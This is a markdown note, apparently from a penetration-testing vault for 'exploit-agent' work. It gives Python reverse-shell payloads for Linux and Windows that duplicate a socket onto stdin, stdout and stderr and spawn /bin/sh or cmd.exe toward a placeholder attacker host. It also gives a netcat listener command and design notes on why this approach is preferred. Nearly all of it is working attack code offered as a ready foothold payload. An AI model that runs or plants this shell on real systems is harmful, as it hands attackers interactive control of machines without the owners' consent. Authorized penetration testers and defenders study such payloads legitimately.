# Python `dup2` Reverse Shell (Real Shell, Not an `exec()` Loop)

Standard foothold payload for this vault's exploit-agent work: a Python
one-liner/script that hands a real interactive OS shell to a listener,
rather than emulating a command channel by hand.

## Pattern (Linux)

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<LHOST>", <LPORT>))
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr
subprocess.call(["/bin/sh", "-i"])
```

Catch it with `nc -lvnp <LPORT>`. Swap `/bin/sh` for `/bin/bash` if present
on the target and interactivity (history/tab-complete) matters.

## Pattern (Windows)

Same `dup2` mechanics, spawn `cmd.exe` instead:

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<LHOST>", <LPORT>))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["cmd.exe"])
```

## Why not a manual `while True: recv → exec() → send` loop

An earlier draft of this pattern read bytes off the socket, decoded them,
ran them through `exec()`, captured stdout/stderr into an `io.StringIO`,
and sent that back — essentially hand-rolling a read-eval-print loop in
Python. Two problems with that approach:

- **`exec()` only runs Python.** Shell built-ins, pipes, redirects, `cd`,
  backgrounding, `sudo -l` — none of that is valid Python, so most of what
  you actually want to do on a foothold doesn't work.
- **It's redundant work.** `dup2`-ing the socket's file descriptor onto the
  process's stdin/stdout/stderr makes the socket *become* the shell
  process's I/O at the OS level. `/bin/sh -i` already has its own
  read-eval-print loop — reading a line, running it, printing the result,
  reading the next line — and because its stdin/stdout are now the socket,
  that loop *is* the reverse shell loop. `subprocess.call()` just blocks
  until the shell exits. No Python-level loop needed; the shell supplies
  its own.

## Notes
- No reconnect/retry logic here on purpose — this is a one-shot foothold
  payload, not a persistence mechanism. Re-trigger the exploit if the
  listener drops. A reconnect loop is a different, separate technique
  (persistence, not initial foothold) — don't conflate the two.
- Obfuscating/renaming this to look like unrelated code (e.g. disguising it
  as a "telemetry" or "config sync" module) is a detection-evasion
  technique, not a functional requirement of the shell itself — keep
  payload code named for what it does when working in this vault, unless a
  specific engagement's rules of engagement call for evasion testing.

## Seen on
- (none yet — add a target link here the first time this pattern lands a
  foothold)
